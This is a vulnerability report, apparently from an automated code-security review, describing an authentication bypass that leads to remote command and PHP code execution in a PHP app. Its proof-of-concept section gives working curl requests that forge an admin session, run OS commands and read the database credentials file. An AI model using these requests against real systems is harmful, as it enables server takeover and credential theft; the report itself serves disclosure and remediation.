# Vulnerability: RCE — `system()` / `eval()` command console gated only by a forgeable admin session

## Summary
`s3cretadm1n/index.php` passes the raw GET parameter `c` to `system()` (`:19`) and the raw
GET parameter `p` to `eval()` (`:22`). The only guard is `isAdmin()` (`:4`), which is a
session boolean with no server-side identity binding (`libs/common.php:16`). An attacker can
set that boolean without credentials via `save_session.php` (`VULN-001`), yielding
unauthenticated arbitrary OS-command and PHP-code execution. Even independently, the use of
`system()`/`eval()` on request input is a direct code-execution sink.

## Confidence
High — found by both taint directions and survived all three adversarial attacks with a
fully cited path (command source at `s3cretadm1n/index.php:18,21`; bypass source at
`save_session.php:11`).

## Authentication Requirement
Unauthenticated (the endpoint's own gate is Authenticated (High Privilege), but it is
bypassed via `VULN-001`'s session poisoning).

## Attack Surface Location
- **Endpoint:** `GET /s3cretadm1n/index.php?c=<cmd>` and `?p=<php>`
- **Handler:** `s3cretadm1n/index.php:18-23`
- **Framework protections bypassed:** guard `isAdmin()` (`:4`) is session-boolean only;
  `AumWAF` (`libs/AumWAF.class.php:34-45`) has no signature for `id`, `phpinfo()`, etc.

## Attack Chain
1. **Initial access:** poison a session via `VULN-001` (or authenticate as a legitimately
   elevated user).
2. **Endpoint interaction:** request `/s3cretadm1n/index.php`, which requires `isAdmin()`.
3. **Malicious input:** `?c=id` (OS command) or `?p=system('id');` (PHP code).
4. **Sink execution:** `system(get('c'))` (`:19`) / `eval(get('p'))` (`:22`).
5. **Post-exploitation:** read `config.php` DB credentials, write files, spawn a reverse
   shell as `www-data`.
6. **Final impact:** unauthenticated remote code execution / full server compromise.

## Data Flow
- **Source (user input):** GET `c` / `p` (`s3cretadm1n/index.php:18,21`); reachability source
  `$_REQUEST['admin']` → `$_SESSION['admin']` (`save_session.php:11`).
- **Sink:** `system()` (`:19`) and `eval()` (`:22`).

```
$_REQUEST['admin'] → $_SESSION['admin'] [save_session.php:11]
  → session('admin') [libs/common.php:16] → isAdmin() [s3cretadm1n/index.php:4]
get('c') [s3cretadm1n/index.php:18] → system() [s3cretadm1n/index.php:19]
get('p') [s3cretadm1n/index.php:21] → eval()   [s3cretadm1n/index.php:22]
```

## Proof of Concept

### Prerequisites
None beyond reachability to the app.

### Exploit Request
```bash
# Forge an admin session (VULN-001)
curl -s -c /tmp/jar.txt 'http://{{TARGET_HOST}}/save_session.php' -o /dev/null
curl -s -b /tmp/jar.txt -c /tmp/jar.txt \
  'http://{{TARGET_HOST}}/save_session.php?debug=1&admin=1'
# OS command execution
curl -s -b /tmp/jar.txt 'http://{{TARGET_HOST}}/s3cretadm1n/index.php?c=id'
# PHP code execution
curl -s -b /tmp/jar.txt -G 'http://{{TARGET_HOST}}/s3cretadm1n/index.php' \
  --data-urlencode "p=echo file_get_contents('/var/www/html/config.php');"
```

### Expected Vulnerable Response
```http
HTTP/1.1 200 OK
Content-Type: text/plain

This is secret admin page, there are nothing here but gold.
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Expected Patched Response
`isAdmin()` is only satisfiable by a real server-side admin login, `save_session.php` no
longer writes arbitrary session keys, and the console is removed. The request then receives
`302 Found / 403 Forbidden` with no command output.

### Impact Demonstration
Arbitrary OS command and PHP execution as `www-data`, e.g.
`?c=cat /var/www/html/config.php` discloses the DB credentials
(`config.php:5-8`), enabling full compromise.

## Affected Code
```php
// s3cretadm1n/index.php:4-23
if(!isAdmin()) {
	redirect('/');
}
...
	if(get('c')) {
		system(get('c'));
	}
	if(get('p')) {
		eval(get('p'));
	}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `get('c')`/`get('p')` are raw
  (`libs/common.php:28-30`); the only guard `isAdmin()` (`:4`) is satisfied by the forged
  session from `VULN-001` (`save_session.php:11`); `AumWAF` does not match the payloads.
- **Impact attack — FAILED to kill.** Direct arbitrary command/code execution — a core
  in-scope category; command output is returned to the caller in `text/plain`.
- **Validity attack — FAILED to kill.** No sanitization on `get('c')`/`get('p')`; the flow
  is not misread.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Remove the `system()`/`eval()` console entirely. If admin actions are required, implement
them as explicit server-side operations with authentication/authorization bound to a real
admin credential and never pass request data to `system`/`eval`/`shell_exec`.
